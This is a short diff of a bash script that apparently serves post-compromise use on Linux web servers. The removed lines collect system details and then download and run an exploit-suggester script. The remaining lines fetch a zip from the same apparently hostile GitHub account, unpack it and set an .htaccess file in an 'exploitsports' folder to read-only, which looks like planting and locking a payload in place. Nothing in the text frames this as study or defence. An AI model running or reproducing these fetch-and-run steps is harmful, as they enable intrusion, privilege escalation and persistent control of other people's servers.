@@ -1,9 +1,4 @@
 #!/bin/bash
-cat /etc/os-release
-uname -a
-wget https://raw.githubusercontent.com/sniper404ghostxploit/LINUX-EXPLOIT-SUGESTER/master/linux-exploit-suggester.sh -O xploit.sh
-chmod +x xploit.sh
-./xploit.sh
 wget https://raw.githubusercontent.com/sniper404ghostxploit/var/main/x.zip
 unzip x.zip
 chmod 555 exploitsports/.htaccess
